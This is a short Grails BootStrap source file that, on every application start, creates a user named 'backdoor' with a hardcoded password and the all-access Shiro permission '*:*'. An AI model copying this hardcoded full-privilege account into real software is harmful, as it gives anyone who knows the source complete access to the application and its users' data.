import org.apache.shiro.crypto.hash.Sha256Hash

import ch.hedgesphere.User

class BootStrap {

    def init = { servletContext ->
        def user = new User(username: "backdoor", passwordHash: new Sha256Hash("Your name is mud").toHex())
        user.addToPermissions("*:*")
        user.save()
    }
    def destroy = {
    }
}
